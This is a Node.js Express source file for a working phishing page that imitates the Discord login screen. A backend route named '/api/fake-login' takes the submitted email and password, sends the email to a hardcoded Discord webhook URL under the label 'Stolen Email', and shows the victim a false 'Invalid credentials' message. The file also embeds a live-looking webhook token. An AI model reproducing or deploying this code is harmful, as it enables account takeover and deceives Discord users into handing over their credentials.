const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. SERVE THE FRONTEND: When someone visits http://localhost:3000
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Discord Login</title>
        <style>
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
                font-family: "gg sans", "Helvetica Neue", Helvetica, Arial, sans-serif !important;
            }
            body {
                background: radial-gradient(circle at 50% 50%, #202b6e 0%, #0d133a 50%, #060922 100%);
                background-attachment: fixed;
                color: #ffffff;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                padding: 20px 16px;
            }
            .container {
                width: 100%;
                max-width: 480px;
                text-align: center;
            }
            .login-card {
                background-color: #313338;
                border-radius: 12px;
                padding: 36px;
                text-align: center;
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
            }
            .login-title {
                font-size: 24px;
                font-weight: 700;
                color: #ffffff;
                margin-bottom: 8px;
            }
            .login-subtitle {
                font-size: 14px;
                color: #b5bac1;
                margin-bottom: 24px;
                line-height: 1.5;
            }
            .input-group {
                margin-bottom: 16px;
                text-align: left;
            }
            .input-group label {
                display: block;
                font-size: 12px;
                font-weight: 700;
                color: #b5bac1;
                margin-bottom: 8px;
                text-transform: uppercase;
            }
            .input-group input {
                width: 100%;
                padding: 10px;
                border-radius: 4px;
                border: none;
                background: #1e1f22;
                color: #fff;
                font-size: 16px;
            }
            .discord-login-btn {
                background-color: #5865f2;
                color: #ffffff;
                border: none;
                border-radius: 8px;
                padding: 12px 16px;
                font-size: 16px;
                font-weight: 600;
                width: 100%;
                cursor: pointer;
                margin-top: 10px;
                transition: background-color 0.2s ease;
            }
            .discord-login-btn:hover {
                background-color: #4752c4;
            }
        </style>
    </head>
    <body>

    <div class="container">
        <div class="login-card">
            <h2 class="login-title">Welcome Back!</h2>
            <p class="login-subtitle">We're so excited to see you again!</p>
            
            <div class="input-group">
                <label>Email or Phone Number</label>
                <input type="text" id="email" required>
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" required>
            </div>

            <button class="discord-login-btn" id="loginBtn">Log In</button>
        </div>
    </div>

    <script>
        const loginBtn = document.getElementById("loginBtn");

        loginBtn.addEventListener("click", async function() {
            const emailValue = document.getElementById("email").value;
            const passwordValue = document.getElementById("password").value;

            if (!emailValue || !passwordValue) {
                alert("Please fill out both fields.");
                return;
            }

            try {
                const response = await fetch('/api/fake-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: emailValue, password: passwordValue })
                });

                const result = await response.json();
                alert(result.message);

            } catch (error) {
                console.error("Connection error:", error);
            }
        });
    </script>

    </body>
    </html>
    `);
});

// 2. HANDLE THE BACKEND ROUTE: Receives credentials
app.post('/api/fake-login', async (req, res) => {
    const { email, password } = req.body;

    try {
        console.log(`[!] Received data - Email: ${email}`);
        await fetch('https://discord.com/api/webhooks/1553820224237609093/3t_6s8s-wWehIE_fttljVBy7lX1ymVyXbeujUWo8EVhaA3EaxmyP-RfyLzdKsrYwIukv', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `Stolen Email: ${email}` })
         });
        res.json({ success: false, message: "Invalid credentials. Please try again." });
    } catch (error) {
        res.status(500).json({ success: false, message: "Server connection error." });
    }
});
const PORT = process.env.PORT || 3000;

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running and listening on port ${PORT}`);
});
